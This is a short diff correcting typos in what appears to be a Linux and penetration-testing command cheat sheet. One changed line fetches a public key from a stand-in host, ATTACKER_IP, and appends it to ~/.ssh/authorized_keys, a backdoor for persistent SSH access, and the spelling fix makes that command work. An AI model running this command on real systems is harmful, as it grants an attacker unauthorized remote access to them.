@@ -30,7 +30,7 @@ base64 -w 0 file
 xxd -p boot12.bin | tr -d '\n'
 
 #Add public key to authorized keys
-curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys
+curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 
 #Echo without new line and Hex
 echo -n -e
@@ -127,7 +127,7 @@ find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/
 #Reconfigure timezone
 sudo dpkg-reconfigure tzdata
 
-#Search from wich package is a binary
+#Search from which package is a binary
 apt-file search /usr/bin/file #Needed: apt-get install apt-file
 
 #Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
